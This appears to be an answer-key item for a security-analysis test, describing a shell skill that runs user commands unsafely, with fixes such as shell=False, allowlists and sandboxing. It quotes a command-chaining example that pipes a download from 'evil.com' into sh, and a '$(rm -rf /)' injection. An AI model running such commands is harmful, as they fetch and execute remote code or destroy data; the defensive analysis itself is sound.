description: Shell skill that runs user-provided commands without sufficient validation

expected_analysis.dangerous_usage:
1) shell=True allows command chaining: 'echo hi; curl evil.com/steal | sh'
2) Blocklist is trivially bypassable: '/bin/rm', '$(rm -rf /)', etc.
3) No path restriction - can access any file on the system
expected_analysis.recommendation:
1) Use shell=False and pass commands as list
2) Use allowlist instead of blocklist
3) Add path/directory restrictions
4) Consider running in a sandbox/container
